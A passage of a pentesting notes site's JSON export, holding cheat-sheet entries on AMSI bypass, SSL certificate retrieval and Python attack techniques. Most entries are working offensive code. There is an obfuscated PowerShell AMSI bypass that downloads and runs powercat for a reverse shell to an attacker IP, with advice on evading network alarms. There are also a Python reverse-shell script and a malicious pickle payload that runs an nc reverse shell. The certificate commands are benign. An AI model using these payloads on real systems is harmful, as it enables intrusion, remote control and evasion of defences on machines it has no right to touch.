style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;+$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;41 6D 73 69 55 74 69 6C 73&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Split&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;forEach&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;char&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]([&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;convert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;::toint16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;forEach&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;+$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;};$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.GetField&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Split&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;forEach&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;char&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]([&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;convert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;::toint16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;forEach&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;+$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;};$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;NonPublic,Static&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.SetValue&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;true&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; IEX &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;New-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; System.Net.Webclient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.DownloadString&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; powercat &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;c &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;p &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;e &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;cmd.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;It’s probably advisable to use your own server to host Powercat in order to make tripping network alarms less likely.&lt;/p&gt;"},"spells/Pull-SSL-certificates-from-an-external-server":{"slug":"spells/Pull-SSL-certificates-from-an-external-server","filePath":"spells/Pull SSL certificates from an external server.md","title":"Pull SSL certificates from an external server","links":[],"tags":["Application/OpenSSL","HowTo","AttackCycle/Reconnaissance"],"content":"# Pull a server&#039;s certificate:\n#\nopenssl s_client -connect ${SERVER}:${PORT}\n \n# When dealing with a mail server using STARTTLS, we need\n# to modify this a bit:\n#\nopenssl s_client -connect ${SERVER}:${PORT} \\\n                 -starttls smtp\n \n# Pull the entire certificate chain:\n#\nopenssl s_client -connect ${SERVER}:${PORT} -showcerts\n \n# Get certificate information:\n#\nopenssl x509 -in $CERT -text -noout\n \n# Calculate a SHA1 fingerprint:\n#\nopenssl x509 -noout -in $CERT -fingerprint\n \n# Calculate a MD5 fingerprint:\n#\nopenssl x509 -noout -in $CERT -fingerprint -md5","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Pull a server&#039;s certificate:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; s_client&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -connect&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# When dealing with a mail server using STARTTLS, we need&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# to modify this a bit:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; s_client&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -connect&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;                 -starttls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; smtp&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Pull the entire certificate chain:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; s_client&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -connect&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -showcerts&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get certificate information:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; x509&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CERT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -text&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -noout&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Calculate a SHA1 fingerprint:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; x509&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -noout&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CERT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -fingerprint&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Calculate a MD5 fingerprint:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; x509&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -noout&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CERT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -fingerprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -md5&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Python":{"slug":"spells/Python","filePath":"spells/Python.md","title":"Python","links":["spells/Quick-n-dirty-Python-web-server","spells/netcat","spells/socat"],"tags":["Language/Python","Scripts","Application/netcat","Application/socat","AttackCycle/Exploitation"],"content":"Quick-n-dirty web server\nTransclude of Quick-n-dirty-Python-web-server\nA simple reverse shell\n\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_ReverseShells.\n\n\n\nimport socket\nimport subprocess\nimport os\n \nattacker_ip = &quot;10.0.0.1&quot;\nattacker_port = 1234\n \ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n \ns.connect((attacker_ip, attacker_port))\n \nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\n \nsubprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])\nCatch it with netcat or socat.\nExploiting Python pickles\nOne way to attack Python webapps is to exploit pickles, and in particular the pickle.loads() operation which reconstructs objects from an encoded data stream. When an object is reconstructed it is actually fully initialized, which means that things like object.__reduce__() are run.\nFor example, the TryHackMe’s OWASP Top 10 room has us use the following code to create a malicious base64 encoded object to feed pickle.loads() (LOCAL_IP gets replaced by your machine’s IP):\nimport pickle\t\t\nimport sys\t\t\nimport base64\t\t\n \ncommand = &#039;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc LOCAL_IP 4444 &gt; /tmp/f&#039;\t\t\n \nclass rce(object):\t\t\n    def __reduce__(self):\t\t\n        import os\t\t\n        return (os.system,(command,))\t\t\n \nprint(base64.b64encode(pickle.dumps(rce())))\nWhat’s getting encoded here is the rce class. Python will call rce.__reduce__() to determine how to initialize this class when pickle.loads() deserializes it, and __reduce__() will return the tuple (os.system, (command,)), where command is basically our standard Metasploit reverse shell. Python then initializes the class by using os.system to call command, and there’s our reverse shell!","richContent":"&lt;h2 id=&quot;quick-n-dirty-web-server&quot;&gt;Quick-n-dirty web server&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#quick-n-dirty-web-server&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Quick-n-dirty-Python-web-server&quot; data-block=&quot;&quot; data-embed-alias=&quot;Quick-n-dirty Python web server&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Quick-n-dirty-Python-web-server&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Quick-n-dirty-Python-web-server&quot;&gt;Transclude of Quick-n-dirty-Python-web-server&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;a-simple-reverse-shell&quot;&gt;A simple reverse shell&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#a-simple-reverse-shell&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_ReverseShells#L14&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_ReverseShells&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;python&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;python&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; socket&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; subprocess&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; os&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;attacker_ip &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;10.0.0.1&lt;/span&gt;&lt;span 